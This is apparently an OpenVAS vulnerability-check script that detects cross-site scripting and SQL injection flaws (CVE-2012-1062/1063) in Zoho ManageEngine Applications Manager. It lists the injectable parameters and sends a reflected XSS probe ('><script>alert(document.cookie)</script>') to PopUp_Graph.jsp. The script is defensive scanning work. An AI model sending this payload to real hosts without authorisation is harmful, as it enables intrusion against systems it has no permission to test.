if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802424" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-1062", "CVE-2012-1063" );
	script_bugtraq_id( 51796 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-02-16 15:09:43 +0530 (Thu, 16 Feb 2012)" );
	script_name( "Zoho ManageEngine Applications Manager Multiple XSS and SQL Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47724" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/72830" );
	script_xref( name: "URL", value: "http://www.vulnerability-lab.com/get_content.php?id=115" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/109238/VL-115.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 8080 );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in context of an affected site
and compromise the application, access or modify data, or exploit latent
vulnerabilities in the underlying database." );
	script_tag( name: "affected", value: "ManageEngine Applications Manager version 9.x and 10.x" );
	script_tag( name: "insight", value: "The flaws are due to an input passed to the

  - 'query', 'selectedNetwork', 'network', and 'group' parameters in various
   scripts is not properly sanitised before being returned to the user.

  - 'viewId' parameter to fault/AlarmView.do and 'period' parameter to
   showHistoryData.do is not properly sanitised before being used in SQL
   queries." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Zoho ManageEngine Applications Manager
and is prone to multiple cross site scripting and SQL injection vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
sndReq = http_get( item: "/jsp/PreLogin.jsp", port: port );
rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
if(rcvRes && egrep( pattern: ">Copyright.*ZOHO Corp.,", string: rcvRes )){
	url = "/jsp/PopUp_Graph.jsp?restype=QueryMonitor&resids=&attids='&attName=" + "><script>alert(document.cookie)</script>";
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>" )){
		security_message( port );
	}
}

